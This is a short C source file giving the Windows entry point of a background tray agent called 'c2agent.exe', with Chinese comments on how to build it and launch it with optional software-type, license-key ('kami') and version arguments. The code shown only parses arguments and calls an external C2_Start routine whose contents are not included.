/*
 * c2agent.c — 独立 EXE 入口（后台托盘进程）
 * 编译：
 *   mingw: gcc -o c2agent.exe c2agent.c -lwininet -lrpcrt4 -lcredui -mwindows -O2 -s
 *   msvc:  cl c2agent.c /link wininet.lib rpcrt4.lib credui.lib /SUBSYSTEM:WINDOWS
 *
 * 用法：
 *   c2agent.exe [software_type] [kami] [version]
 *   参数均可选；software_type 默认 "win_agent"
 *
 * 其他软件启动方式（无需改动自身代码）：
 *   Python:    subprocess.Popen(["c2agent.exe", "myapp", "", "2.0"])
 *   易语言:    运行程序("c2agent.exe myapp  2.0", 假)
 *   Go:        exec.Command("c2agent.exe", "myapp").Start()
 */
#include "c2.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nCmdShow) {
    (void)hInst; (void)hPrev; (void)nCmdShow;

    /* 解析命令行参数 */
    char* argv[8] = {0};
    int argc = 0;
    char* p = lpCmd;
    while (*p && argc < 7) {
        while (*p == ' ') p++;
        if (!*p) break;
        argv[argc++] = p;
        while (*p && *p != ' ') p++;
        if (*p) *p++ = '\0';
    }

    const char* sw_type = argc > 0 && argv[0][0] ? argv[0] : NULL;
    const char* kami    = argc > 1 && argv[1][0] ? argv[1] : NULL;
    const char* ver     = argc > 2 && argv[2][0] ? argv[2] : NULL;

    C2_Start(sw_type, kami, ver);

    /* 等待，直到 C2_Stop() 被调用 */
    while (InterlockedCompareExchange(&g_running, 1, 1) == 1) {
        Sleep(1000);
    }
    return 0;
}
